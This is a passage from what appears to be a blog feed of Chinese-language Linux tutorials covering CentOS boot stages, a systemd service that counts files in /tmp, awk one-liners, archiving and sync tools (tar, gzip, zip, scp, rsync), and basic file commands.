class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">Cent OS 6启动流程<br>1.POST加电自检，加载BIOS信息，获取第一个启动设备，post加电自检<br>2.读取一个启动设备的MBR分区信息<br>grub1：加载MBR分区前446个字节<br>grub1.5：扇区，找到MBR分区的文件系统，因为grub2的/boot/grub2这个目录是在文件系统上的，所以要找到加载文件系统，文件系统加载驱动<br>grub2：进入到/boot/grub2里面，找到grub.cfg，从grub.cfg的配置信息内，而找到内核文件（根据配置文件）<br>3.加载内核文件，加载根分区，系统初始化<br>4.运行init进程，确认init级别，可以随时切换init进程的运行级别（/sbin/init读取）---/etc/inittab，确定是init 3模式的启动方式，init执行对应级别的脚本，init执行/etc/rc.d/rc.local自启动文件/脚本，不同的init级别存放的脚本不同<br>5.启动各自的脚本<br>6.建立访问终端<span class="hljs-built_in">tty</span>，比如root登录就是tty0<br>7.用户登录<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828180459254-642610396.png" alt="image-20220826230021539"></p><p>BootLoader：操作系统引导的，引导启动到哪个OS<br>BootLoader分类：分为windows和Linux的BootLoader</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">Cent OS 7<br>1.POST自检，选择启动的设备<br>2.引导系统启动BootLoader---&gt;grub2，Cent OS 7后使用grub2版本<br>grub 1：前446字节<br>grub 1.5：找到扇区，加载文件系统驱动，能读取文件系统上的文件grub.cfg<br>grub 2：进入到/boot/grub2内找到grub.cfg，从而找到内核文件，启动<br>3.加载驱动，加载内核<br>4.内核初始化，使用systemd代替之前的init，systemd的pid为1<br>5.执行.target的所有单元unit，加载单元unit<br>6.执行默认target级别，默认是multi-user级别(level3)<br>7.启动multi-user下的所有服务，执行/etc/rc.local(需要+x执行权限)<br>8.登录到终端<br><br><span class="hljs-comment">##生成系统启动的文件boot.html</span><br>systemd-analyze plot &gt; boot.html<br>systemd特点：并行启动服务，不需要启动依赖再启动，启动花了25s<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828180459593-435590638.png" alt="image-20220826230042425"></p><h1 id="4-自定义systemd服务，检查-tmp文件个数"><a href="#4-自定义systemd服务，检查-tmp文件个数" class="headerlink" title="4.自定义systemd服务，检查/tmp文件个数"></a>4.自定义systemd服务，检查/tmp文件个数</h1><p>自定义一个systemd服务定时去其他服务器上检查/tmp/下文件的个数，如果发现数量有变化就记录变化情况到文件中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemd服务基本格式<br><br>[Unit]<br>Description=hello <span class="hljs-built_in">test</span><br><br>[Service]<br>TimeoutStartSec=0<br>ExecStart=/bin/sh /script/dir_check.sh<br><span class="hljs-comment">#ExecStop=/bin/kill sh</span><br>KillSignal=SIGQUIT<br>TimeoutStopSec=5<br>KillMode=process<br>PrivateTmp=<span class="hljs-literal">true</span><br><br><br>[Install]<br>WantedBy=multi-user.target<br><span class="hljs-comment">##采用同一个目录下间隔时间作为比较，比较文件的数量</span><br>path1=/tmp<br>diff1=`<span class="hljs-built_in">ls</span> -l <span class="hljs-variable">$path1</span> | grep <span class="hljs-string">&quot;^-&quot;</span> | <span class="hljs-built_in">wc</span> -l`<br><span class="hljs-built_in">sleep</span> 30<br>path2=/tmp<br>diff2=`<span class="hljs-built_in">ls</span> -l <span class="hljs-variable">$path2</span> | grep <span class="hljs-string">&quot;^-&quot;</span> | <span class="hljs-built_in">wc</span> -l`<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1:<span class="hljs-variable">$diff1</span>,2:<span class="hljs-variable">$diff2</span>&quot;</span><br>diff3=`<span class="hljs-built_in">echo</span> <span class="hljs-variable">$diff1</span>-<span class="hljs-variable">$diff2</span> | bc`<br><span class="hljs-built_in">date</span>=`<span class="hljs-built_in">date</span> +%H-%M-%S`<br><br><span class="hljs-comment">##取绝对值</span><br>num=`<span class="hljs-built_in">expr</span> 0 - <span class="hljs-variable">$diff3</span>`<br><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$diff2</span> -lt <span class="hljs-variable">$diff1</span> ];<span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;路径<span class="hljs-variable">$&#123;path1&#125;</span>减少了文件，数量为<span class="hljs-variable">$num</span>，时间:<span class="hljs-variable">$date</span>&quot;</span> &gt;&gt; /tmp/record.log<br><span class="hljs-keyword">elif</span> [ <span class="hljs-variable">$diff2</span> -gt <span class="hljs-variable">$diff1</span> ];<span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;路径<span class="hljs-variable">$&#123;path1&#125;</span>增加了文件，数量为<span class="hljs-variable">$num</span>，时间:<span class="hljs-variable">$date</span>&quot;</span> &gt;&gt; /tmp/record.log<br><span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;无变化，时间：<span class="hljs-variable">$date</span>&quot;</span><br><span class="hljs-keyword">fi</span><br>find week4 -<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;%P\n&quot;</span> | <span class="hljs-built_in">sort</span> &gt; file1<br>find week3 -<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;%P\n&quot;</span> | <span class="hljs-built_in">sort</span> | diff file1 &gt;diff.txt<br></code></pre></td></tr></table></figure><h1 id="5-写Linux内核编译安装博客"><a href="#5-写Linux内核编译安装博客" class="headerlink" title="5.写Linux内核编译安装博客"></a>5.写Linux内核编译安装博客</h1><p>Linux机器在某个发行版上编译安装指定的版本用途：为了适配不同应用的需求，需要应对使用更高的内核版本需要执行操作<br>1.下载内核文件(stable版本)，自选内核版本，目前使用centos 7.9的内核版本：uname -r<br>3.10.0-1160.15.2.el7.x86_64<br>2.安装编译内核文件必要的依赖库<br>3.配置内核编译参数<br>4.编译内核<br>5.安装内核<br>6.修改默认启动的内核，centos7：/boot/grub2/grub.cfg<br>7.重启机器，验证版本变更：uname -r</p><h1 id="6-总结5个自我觉得比较有用的awk的使用场景-持续更新"><a href="#6-总结5个自我觉得比较有用的awk的使用场景-持续更新" class="headerlink" title="6.总结5个自我觉得比较有用的awk的使用场景(持续更新)"></a>6.总结5个自我觉得比较有用的awk的使用场景(持续更新)</h1><p>比如在什么情况下用awk处理文本效率最高，发散题，至少写1个。<br>awk常见格式：NR表示行，NF表示最后一列，$NF代表最后一列，$(NF-1)代表倒数第二列</p><p>awk处理文本能力很强，常用的场景<br>1.有指定分隔符的场景，可以使用awk直接分割，awk -F’=’，直接输出域; awk分隔符还可以分隔空格之类的，awk ‘[ .]’<br>2.没有指定分隔符的场景，默认一些场景是空格，awk直接默认压缩了，不需要使用tr在进行一次压缩<br>3.awk支持正则表达式筛选，可以直接套用输出，awk ‘/netmask/{print $1}’</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##常见案例</span><br>1.awk处理nginx服务日志，列出访问最多的5个IP源IP地址，查看访问量<br>awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> /var/log/nginx/access.log | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | hrad -n 5 <br>nginx日志取访问的IP地址+访问时间：<span class="hljs-built_in">cat</span> /var/log/nginx/access.log | awk -F <span class="hljs-string">&quot;[[ ]&quot;</span> <span class="hljs-string">&#x27;&#123;print $1,$5&#125;&#x27;</span> | <span class="hljs-built_in">head</span> -n 5<br><br>2.awk利用数组统计所有TCP连接的状态，并且排序(包括LISTEN，ESTABLISHED等)<br>netstat -ant | awk <span class="hljs-string">&#x27;&#123;state[$NF]++&#125; END &#123;for (i in state) print i,state[i]&#125;&#x27;</span> <br><br>3.awk处理系统用户和登录bash<br>awk -F<span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;/\/bin\/bash/&#123;print $1 &quot;,&quot; $7&#125;&#x27;</span> /etc/passwd<br><br>4.docker删除在运行的容器，或者是跑容器<br>docker <span class="hljs-built_in">rm</span> -f `docker ps | grep nginx | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>`<br>docker run --name matomo --<span class="hljs-built_in">link</span> mysql:mysql -p 8003:80 -v /test/matomo:/var/www/html -d `docker images | grep matomo | awk <span class="hljs-string">&#x27;&#123;print $3&#125;&#x27;</span>`<br><br>5.查看目录下所有.sh文件的大小，其他类型的文件类似<br><span class="hljs-built_in">ls</span> -al *.jpg | awk <span class="hljs-string">&#x27;&#123;sum+=$5&#125; END &#123;print sum&#125;&#x27;</span><br><br>6.取IP地址<br>ifconfig eth0 | awk <span class="hljs-string">&#x27;/netmask/&#123;print $2&#125;&#x27;</span><br><br>7.取磁盘固定分区的使用率<br><span class="hljs-built_in">df</span> -h | grep <span class="hljs-string">&quot;^/dev&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $5&#125;&#x27;</span> | <span class="hljs-built_in">tr</span> -d %<br><span class="hljs-built_in">df</span> -h | awk <span class="hljs-string">&#x27;/\/dev\//&#123;print $5&#125;&#x27;</span> | <span class="hljs-built_in">tr</span> -d %<br><br>8.awk正则表达式：去除掉空行(^$)或者是注释的行(^<span class="hljs-comment">#)，非空行或者是注释行</span><br>awk <span class="hljs-string">&#x27;!/^#|^$/&#x27;</span> /etc/fstab<br>只取注释行<br>awk <span class="hljs-string">&#x27;/^#/&#x27;</span> /etc/fstab<br><br>9.awk实现<span class="hljs-keyword">while</span>循环，bash命令行完成<br>awk <span class="hljs-string">&#x27;BEGIN&#123;i=1;sum=0;while(i&lt;=100)&#123;sum+=i;i++&#125;;&#123;print sum&#125;&#125;&#x27;</span> ---&gt;5050<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux文件备份与压缩</title>
    <link href="/2023/07/18/Linux%E6%96%87%E4%BB%B6%E5%A4%87%E4%BB%BD%E4%B8%8E%E5%8E%8B%E7%BC%A9/"/>
    <url>/2023/07/18/Linux%E6%96%87%E4%BB%B6%E5%A4%87%E4%BB%BD%E4%B8%8E%E5%8E%8B%E7%BC%A9/</url>
    
    <content type="html"><![CDATA[<p>文档目录：</p><p>一、tar：打包备份</p><p>二、gzip：压缩或解压文件</p><p>三、zip：打包和压缩文件</p><p>四、unzip：解压zip文件</p><p>五、scp：远程文件复制</p><p>六、rsync：文件同步工具</p><p>预置相关文件数据：</p><p><img src="640-1689665119281-3-1689665119985-5.png" alt="图片"></p><p><strong>一、tar：打包备份</strong></p><p> 1、tar -zcvf <a href="http://www.tar.gz/">www.tar.gz</a> ./html/ #打包，z-giz的解压或压缩，v过程，c建立tar包，f指定压缩的文件名字<img src="640-1689665123030-7.png" alt="图片"></p><p> 2、tar -ztvf <a href="http://www.tar.gz/">www.tar.gz</a> #t查看压缩包中内容，z可省略，v可省略</p><p><img src="640-1689665128788-10.png" alt="图片"></p><p> 3、tar -zxvf <a href="http://www.tar.gz/">www.tar.gz</a> -C /tmp/ #C指定解压的路径，不在就解压在当前目录</p><p><img src="640-1689665131040-13.png" alt="图片"></p><p> 4、tar -zcvf <a href="http://www.tar2.gz/">www.tar2.gz</a> ./html/ –exclude=html/mrwhite/test #排除目录打包，目录结尾不要加/，否则会报错</p><p> <img src="640-1689665133096-16.png" alt="图片"></p><p>5、tar -zcvf <a href="http://www.tar3.gz/">www.tar3.gz</a> ./html/ –exclude=html/mrwhite/test –exclude html/mrwhite #排除两个目录</p><p><img src="640-1689665136237-19.png" alt="图片"></p><p> 6、tar zcvfX paichu.tar.gz list.txt ./html/ #排除指定文件内目录</p><p><img src="640-1689665138089-22.png" alt="图片"></p><p> 7、tar zcvfh local.tar2.gz rc.local #h打包实际的文件</p><p><img src="640-1689665139569-25.png" alt="图片"></p><p> 8、注意：</p><p>如需要打包的目录为相对路径，–exclude只能接相对路径</p><p>如需要打包的目录为绝对路径，–exclude可以接绝对路径也能接相对路径</p><p>9、tar zcf etc.tar.gz <code>find . -type f</code> #打包所有普通文件，使用tar内 反引号中嵌套find语</p><p><img src="640-1689665141557-28.png" alt="图片"></p><p> <strong>二、gzip：压缩或解压文件</strong></p><p> 1、gzip *.html #压缩所有.html结尾的文件为.gz，并且自动删除源文件</p><p><img src="640-1689665143782-31.png" alt="图片"></p><p> 2、gzip -l *.gz #不解压显示压缩文件的信息</p><p><img src="640-1689665145262-34.png" alt="图片"></p><p> 3、gzip -dv *.gz #d为解压，v为过程</p><p><img src="640-1689665147022-37.png" alt="图片"></p><p> 4、gzip -c test.html &gt; test.gz #-c压缩时重定向</p><p><img src="640-1689665150657-40.png" alt="图片"></p><p> 5、gzip -dc test.gz &gt; test1.html #-dc解压缩时重定向</p><p><img src="640-1689665153465-43.png" alt="图片"></p><p> 6、zcat test.txt.gz #直接查看压缩包文件</p><p><img src="640-1689665156038-46.png" alt="图片"></p><p> <strong>三、zip：打包和压缩文件</strong></p><p> 1、zip test.zip 123.txt 124.txt #将123，124文件压缩为test.zip</p><p><img src="640-1689665157862-49.png" alt="图片"></p><p> 2、zip -r test3.zip 12345/ #将12345文件夹以及下面的文件压缩成test3.zip</p><p><img src="640-1689665159423-52.png" alt="图片"></p><p> 3、zip -r test4.zip ./12345/ -x 12345/test.zip #压缩12345文件夹中内容但是排除掉其中的test.zip</p><p><img src="640-1689665161018-55.png" alt="图片"></p><p> <strong>四、unzip：解压zip文件</strong></p><p>1、unzip -l test2.zip #看压缩文件列表</p><p> <img src="640-1689665162893-58.png" alt="图片"></p><p> 2、unzip test.zip #解压缩文件</p><p><img src="640-1689665164410-61.png" alt="图片"></p><p> 3、unzip test.zip #如已有文件 ，y替换，n不替换，A所有文件替换，N所有文件不替换，r重命名</p><p><img src="640-1689665172413-67-1689665305114-70.png" alt="图片"></p><p>4、unzip -v test.zip # 解压缩并显示信息</p><p><img src="640-1689665167960-64.png" alt="图片"></p><p>5、unzip -o test.zip #解压缩并不替换覆盖</p><p><img src="640-1689665331158-78.png" alt="图片"></p><p>6、unzip -d /haha/ test.zip #解压缩并指定目录</p><p><img src="640-1689665311738-72.png" alt="图片"></p><p> <strong>五、scp：远程文件复制(适合全量)</strong></p><p> 1、scp testScp.txt 192.168.37.9:/root/mytest2020122702/ #远程拷贝</p><p><img src="640-1689665316417-75.png" alt="图片"></p><p> 查看远程服务器</p><p><img src="640-1689665341527-81.png" alt="图片"></p><p>2、scp -p testScp.txt 192.168.37.9:/root/mytest2020122702/ #文件属性不变</p><p><img src="640-1689665343844-84.png" alt="图片"></p><p> 远程服务器，文件属性一致</p><p><img src="640-1689665346133-87.png" alt="图片"></p><p> 3、scp -r mytest202012* 192.168.37.9:/root/ #-r递归复制目录 </p><p><img src="640-1689665349317-90.png" alt="图片"></p><p> 查看远程主机对应目录</p><p><img src="640-1689665351159-93.png" alt="图片"></p><p> 4、scp -rp 192.168.37.9:/root/mytest20201228 . #远程拷贝文件至当前目录</p><p><img src="640-1689665353326-96.png" alt="图片"></p><p> <strong>六、rsync：文件同步工具(适合增量)</strong></p><p>1、rsync -av data1/ data2/ #-a为递归+保持属性，等价于-rtopgDl -v为详细输出 ，带斜杠为复制文件下的内容</p><p><img src="640-1689665354950-99.png" alt="图片"></p><p>2、rsync -av data1 data2/ #不带斜杠为复制目录本身及目录下的文件</p><p><img src="640-1689665356900-102.png" alt="图片"></p><p> 3、rsync data1/test1 data2 #复制data1下文件至data2目录下</p><p><img src="640-1689665358669-105.png" alt="图片"></p><p> 4、rsync -av –delete data2/ data1/ #删除data1中内容使其与data2中保持一致</p><p><img src="640-1689665360215-108.png" alt="图片"></p><p> 5、rsync -av 192.168.37.8:/root/mytestRsync/ mytestRsync2/ #远程拉取目录</p><p><img src="640-1689665361776-111.png" alt="图片"></p><p><img src="640-1689665363844-114.png" alt="图片"></p><p> 6、rsync -av mytestRsync 192.168.37.9:/root/  #推送至远程目录</p><p><img src="640-1689665365215-117.png" alt="图片"></p><p> <img src="640-1689665367432-120.png" alt="图片"></p><p> <em>7、rsync -av -e ‘ssh -p 22’ . 192.168.37.9:/root/mytestRsync/ #-e选项借助ssh隧道加密</em></p><p><img src="640-1689665371924-123.png" alt="图片"></p><p> <img src="640-1689665375671-126.png" alt="图片"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux文件与目录操作</title>
    <link href="/2023/07/18/Linux%E6%96%87%E4%BB%B6%E4%B8%8E%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C/"/>
    <url>/2023/07/18/Linux%E6%96%87%E4%BB%B6%E4%B8%8E%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<p>文档目录：</p><p>一、pwd:显示当前位置</p><p>二、cd：切换目录</p><p>三、tree：树形结构显示目录</p><p>四、mkdir 创建目录</p><p>五、touch：创建空文件或改变文件时间戳</p><p> 六、ls：显示目录下内容相关属性信息</p><p>七、cp：复制文件或目录</p><p>八、mv：移动或冲命令</p><p>九、rm：删除文件或目录</p><p>十、rmdir：删除空目录</p><p>十一、ln：建立硬、软链接</p><p>十二、readlink：查看符号链接文件内容</p><p>十三、find：查找目录下文件</p><p>十四、xargs：将标准输入转换成命令行参数</p><p>十五、rename：重命名</p><p>十六、basename：显示文件名或目录名</p><p>十七、dirname：显示文件或目录路径</p><p>十八、chattr：改为文件扩展属性</p><p>十九、lsattr：查看文件属性</p><p>二十、file：显示文件类型</p><p>二十一、md5sum：计算与校验文件MD5值</p><p>二十二、chown：改为文件或目录的用户和用户组</p><p>二十三、chmod：改变文件或目录权限</p><p>二十四、chgrp：更改文件用户组</p><p>二十五、umask：显示或设置权限掩码</p><p>1、pwd：print working directory</p><p>2、 #显示逻辑路径</p><p>pwd -L 同echo $pwd </p><p> <img src="640.png" alt="图片"></p><p>3、显示链接路径</p><p><img src="640-1689664756761-3.png" alt="图片"></p><p>二、cd：切换目录</p><p>1、cd：change directory</p><p>2、cd -P：切换到链接的路径</p><p><img src="640-1689664759010-6.png" alt="图片"></p><p>3、cd -L：切换逻辑目录</p><p><img src="640-1689664760618-9.png" alt="图片"></p><p>4、cd - :切换到用户上一家目录</p><p><img src="640-1689664762329-12.png" alt="图片"></p><p>5、cd ~：切换到用户HOME对于目录，同CD</p><p>6、cd.. ：切换到上一级目录，同cd . 与 cd ../</p><p><img src="640-1689664763910-15.png" alt="图片"></p><p>三、tree：树形结构显示目录</p><p>1、安装：yum -y install tree</p><p><img src="640-1689664765588-18.png" alt="图片"></p><p> 2、tree当前目录的结构</p><p><img src="640-1689664769560-21.png" alt="图片"></p><p> 3、tree -a：包含.开头的隐藏文件</p><p><img src="640-1689664771109-24.png" alt="图片"></p><p> 4、tree -L 1：遍历1层级结构</p><p><img src="640-1689664772919-27.png" alt="图片"></p><p> 5、tree -d . 只显示目录</p><p><img src="640-1689664774345-30.png" alt="图片"></p><p> 6、tree -f(i)：显示完整的路径名称（不显示树枝）</p><p><img src="640-1689664775990-33.png" alt="图片"></p><p> 7、tree - L 1 F :区分目录与文件</p><p><img src="640-1689664777785-36.png" alt="图片"></p><p> 过滤目录</p><p><img src="640-1689664779617-39.png" alt="图片"></p><p> 过滤斜线结尾（等于过滤目录）</p><p><img src="640-1689664781939-42.png" alt="图片"></p><p>四、mkdir 创建目录</p><p>1、mkdir：make directory</p><p>2、mkdir dir1 dir2 #创建多个目录</p><p><img src="640-1689664784011-45.png" alt="图片"></p><p> 3、mkdir -p #递归创建目录,存在目录时不报错</p><p><img src="640-1689664786031-48.png" alt="图片"></p><p> 4、mkdir -pv #显示创建过程</p><p><img src="640-1689664787944-51.png" alt="图片"></p><p> 5、创建多目录1：mkdir -pv dir0/{dir1-1,dir1-2}/{dir2-1,dir2-2}</p><p> <img src="640-1689664789481-54.png" alt="图片"></p><p> 创建多目录2：mkdir -pv test/dir{1..5} ok/{a..e}</p><p> <img src="640-1689664791187-57.png" alt="图片"></p><p> 6、mkdir -m 333 dir2 #创建目录并设置权限</p><p> <img src="640-1689664794886-60.png" alt="图片"></p><p>7、简单介绍{}用法</p><p>echo {b,c}</p><p><img src="640-1689664796735-63.png" alt="图片"></p><p>echo a{b,c}</p><p><img src="640-1689664798369-66.png" alt="图片"></p><p>echo a{,c}</p><p> <img src="640-1689664800383-69.png" alt="图片"></p><p> echo {1..8} 1{a..h} </p><p><img src="640-1689664801997-72.png" alt="图片"></p><p>8、克隆目录结构</p><p>mkdir -pv test/dir{1..5} ok/{a..e}</p><p>tree -fid –noreport test &gt;&gt; ~/.test.txt</p><p>cd /tmp/</p><p>mkdir -p <code>cat _/.test.txt</code>(反引号)</p><p><img src="640-1689664806712-75.png" alt="图片"></p><p>五、touch：创建空文件或改变文件时间戳</p><p>1、touch a.txt b.txt #创建多个空文件</p><p><img src="640-1689664809071-78.png" alt="图片"></p><p>2、查看时间戳：stat a.txt</p><p><img src="640-1689664810455-81.png" alt="图片"></p><p> 3、分别查询对应的时间戳</p><p>ls -lu：access time</p><p>ls -lt：modify time</p><p>ls -lc：change time</p><p><img src="640-1689664812066-84.png" alt="图片"></p><p> 4、touch -m a.txt  #更改最后修改时间</p><p> <img src="640-1689664814089-87.png" alt="图片"></p><p> 5、touch -a a.txt  #更改最后访问时间</p><p><img src="640-1689664815840-90.png" alt="图片"></p><p> 6、touch -d 20201001 a.txt  #指定创建/修改的时间（修改时间）</p><p> <img src="640-1689664817419-93.png" alt="图片"></p><p>7、修改b.txt时间属性与a.txt一致（修改时间）</p><p>touch -r a.txt b.txt</p><p><img src="640-1689664819004-96.png" alt="图片"></p><p> 8、设置文件为 201512312234.50的时间格式</p><p>touch -t 201512312234.50 a.txt</p><p><img src="640-1689664821172-99.png" alt="图片"></p><p> 六、ls：显示目录下内容相关属性信息</p><p>1、ls=list directory contents 同dos下dir命令</p><p>2、ls -a #含隐藏文件，其中.为当前目录 ..为上级目录</p><p><img src="640-1689664823139-102.png" alt="图片"></p><p>3、ls -l #详细信息含最后修改时间</p><p><img src="640-1689664824785-105.png" alt="图片"></p><p> 4、ll –time-style=long-iso #显示完整时间格式</p><p>等同于ll –full time</p><p><img src="640-1689664827244-108.png" alt="图片"></p><p>5、ll –time-style=long-iso –time=atime  #显示文件的访问时间</p><p><img src="640-1689664828953-111.png" alt="图片"></p><p> 可使用cat进行验证</p><p> 6、ls -F  #过滤文件及目录</p><p>ls -F|grep /  #过滤目录</p><p>ls -F|grep -v /  #过滤普通文件</p><p><img src="640-1689664830594-114.png" alt="图片"></p><p> 7、ls -l mytest20201204/ #显示目录内内容</p><p>ls -ld mytest20201204/  #显示目录本身</p><p><img src="640-1689664832346-117.png" alt="图片"></p><p> 8、ls -R：递归查看目录</p><p><img src="640-1689664834176-120.png" alt="图片"></p><p>9、ls -lt  #按照时间顺序排序（最后显示最前的）</p><p>ls -lrt #按照时间顺序倒排（最后显示最后的）</p><p><img src="640-1689664835959-123.png" alt="图片"></p><p> 10、 ls -F  #链接展示为@</p><p> <img src="640-1689664838083-126.png" alt="图片"></p><p> ls -lF /etc/init.d/ # *代表可执行的普通文件</p><p><img src="640-1689664839415-129.png" alt="图片"></p><p> 11、ls -lhi #-h参数为文件大小人类可读， -i显示文件的inode值，链接相关的</p><p> <img src="640-1689664841144-132.png" alt="图片"></p><p>七、cp：复制文件或目录</p><p>1、cp=copy centos加了别名cp -i 覆盖需要确认</p><p>2、cp -a 包含</p><p>cp -p：复制时候保持文件的所有者，权限及时间属性</p><p>cp -d：复制链接本身，且保留符号链接指向的文件或目录</p><p>cp -r：递归渎职目录</p><p><img src="640-1689664845331-135.png" alt="图片"></p><p> 3、cp覆盖直接文件不提示方案</p><p>普通复制时候需要人工确认如下：</p><p><img src="640-1689664847529-138.png" alt="图片"></p><p> 方法1：/usr/bin/cp file1.txt file2.txt  #使用绝对路径命令-直接覆盖</p><p><img src="640-1689664848924-141.png" alt="图片"></p><p> 方法2： \cp file1.txt file2.txt</p><p><img src="640-1689664850694-144.png" alt="图片"></p><p> 方法3：unalias cp file1.txt file2.txt  #临时取消别名</p><p><img src="640-1689664852365-147.png" alt="图片"></p><p> 方法4：修改系统环境变量（不建议使用）</p><p><img src="640-1689664853859-150.png" alt="图片"></p><p> 4、快速备份命令</p><p>cp file1.txt{,_backup}</p><p>cp -a mytest7{,_backup}</p><p><img src="640-1689664855666-153.png" alt="图片"></p><p> <img src="640-1689664857441-156.png" alt="图片"></p><p>八、mv：移动或冲命令</p><p>1、mv=move+rename，默认别名mv -i，提示是否覆盖</p><p>2、屏蔽mv别名：\mv file1.txt file2.txt</p><p><img src="640-1689664859661-159.png" alt="图片"></p><p> <img src="640-1689664861755-162.png" alt="图片"></p><p> 3、移动多文件<em>匹配：mv dir</em> testdir/</p><p><img src="640-1689664869295-165.png" alt="图片"></p><p> 4、mv -t testdir1/ dir*  #反转移动</p><p><img src="640-1689664871172-168.png" alt="图片"></p><p>九、rm：删除文件或目录</p><p>1、rm=remove files or directories，默认带rm -i</p><p>2、rm -rf testdir1/ #强行删除目录，不需要确认</p><p><img src="640-1689664872772-171.png" alt="图片"></p><p> 3、rm删除时需要先备份，并且避免使用通配符</p><p>十、rmdir：删除空目录</p><p>1、rmdir=remove empty directories</p><p>2、rmdir -p -v dir1/a/b #递归删除目录且显示删除过程，顺序为从子目录到父目录</p><p><img src="640-1689664874533-174.png" alt="图片"></p><p>十一、ln：建立硬、软链接</p><p>1、ln=link分hard link与symbolic link</p><p>2、系统限制，暂无法创建硬链接</p><p><img src="640-1689664875921-177.png" alt="图片"></p><p> 3、ln -s dir1/dir1.txt dir_softlink #软链接不能事先存在</p><p><img src="640-1689664878408-180.png" alt="图片"></p><p> 4、文件链接测试</p><p>删除源文件，软连接显示为红色</p><p><img src="640-1689664880022-183.png" alt="图片"></p><p> 删除软链接，源文件不受影响</p><p><img src="640-1689664881530-186.png" alt="图片"></p><p>十二、readlink：查看符号链接文件内容</p><p>1、readlink dir1_softlink</p><p><img src="640-1689664883579-189.png" alt="图片"></p><p> 2、readlink -f dir1_softlink  #显示最后一个非符号链接文件</p><p><img src="640-1689664885238-192.png" alt="图片"></p><p>十三、find：查找目录下文件</p><p>1、查找指定时间内修改过的文件</p><p>find . -atime -2 #查找2天内受到访问的文件</p><p><img src="640-1689664886903-195.png" alt="图片"></p><p> find /tmp/ -mtime -5 #绝对路径下，5天内修改的文件</p><p> <img src="640-1689664894068-198.png" alt="图片"></p><p>find /tmp/ -mtime 2 #绝对路径下，2天前修改的文件</p><p> <img src="640-1689664896057-201.png" alt="图片"></p><p>2、用-name指定关键字查找</p><p>find . -mtime +2 -name ‘*.txt’ #查找2天前以txt结尾的文件</p><p><img src="640-1689664898313-204.png" alt="图片"></p><p> 3、利用！反向查找</p><p>find . -type d #查找所有目录</p><p>find . ! -type d #查找所有非目录</p><p><img src="640-1689664900292-207.png" alt="图片"></p><p> 4、按目录或文件的权限查找</p><p>find . -perm 755 #查找755权限的内容</p><p><img src="640-1689664902032-210.png" alt="图片"></p><p> 5、按照大小查看</p><p>find . -size +20c #查找文件大小&gt;20字节的文件</p><p><img src="640-1689664903652-213.png" alt="图片"></p><p> 6、查找文件时忽略目录</p><p>find /root/mytest20201204/mytest1/ -path ‘/root/mytest20201204/mytest1/dir1’ -prune -o -print #忽略单个目录</p><p><img src="640-1689664905578-216.png" alt="图片"></p><p> find /root/mytest20201204/mytest1/ ( -path /root/mytest20201204/mytest1/dir1 -o -path /root/mytest20201204/mytest1/dir2 ) -prune -o -print #忽略多个文件<img src="640-1689664907728-219.png" alt="图片"></p><p> 7、user与nouser的查找</p><p>[root@localhost mytest1]# find . -user nobody #用户为nobody</p><p><img src="640-1689664909443-222.png" alt="图片"></p><p>[root@localhost mytest1]# find . -nouser #查找无任务用户文件</p><p> <img 